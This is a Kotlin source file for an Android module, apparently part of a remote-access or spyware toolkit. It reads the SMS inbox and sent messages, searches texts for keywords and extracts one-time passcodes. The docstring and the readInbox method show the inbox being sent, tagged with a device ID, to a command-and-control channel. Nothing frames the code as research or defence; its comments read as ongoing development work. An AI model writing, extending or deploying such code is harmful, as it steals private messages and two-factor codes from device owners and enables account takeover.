// ============================================================
// FILE: android/app/src/main/java/com/xrc/sensors/SMS.kt
// ============================================================
package com.xrc.sensors

import android.Manifest
import android.content.Context
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity
import com.xrc.core.toJsonString

/**
 * SMS — SMS reading and management module.
 *
 * Wraps SMSReader with C2 reporting capabilities.
 */
class SMS(
    private val context: Context,
    // FIXED: nullable with default
    private val channelClient: ChannelClient? = null
) {
    companion object {
        private const val TAG = "SMSModule"
    }

    private val reader = SMSReader(context)

    /**
     * Read inbox and report to C2.
     */
    fun readInbox(): String {
        val inbox = reader.readInbox(50)
        val deviceId = Identity.getDeviceId(context)
        val msg = Message(
            type = Protocol.TYPE_SENSOR_DATA,
            id = "sms_inbox_${System.currentTimeMillis()}",
            device_id = deviceId,
            // FIXED: List<Map<String, Any>> → JSON via recursive helper
            payload = mapOf(
                "type" to "sms_inbox",
                "data" to inbox,
                "count" to inbox.size
            ).toJsonString()
        )
        channelClient?.send(msg) // FIXED: null-safe
        return inbox.toJsonString()
    }

    /**
     * Read sent messages.
     */
    fun readSent(): List<Map<String, Any>> = reader.readSent(50)

    /**
     * Search SMS for keywords.
     */
    fun search(keywords: List<String>): List<Map<String, Any>> = reader.search(keywords)

    /**
     * Find OTP codes in SMS.
     */
    fun findOtps(): List<Map<String, Any>> = reader.findOTPs()

    /**
     * Check if SMS permission is granted.
     */
    fun hasPermission(): Boolean {
        return context.checkSelfPermission(Manifest.permission.READ_SMS) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
    }
}
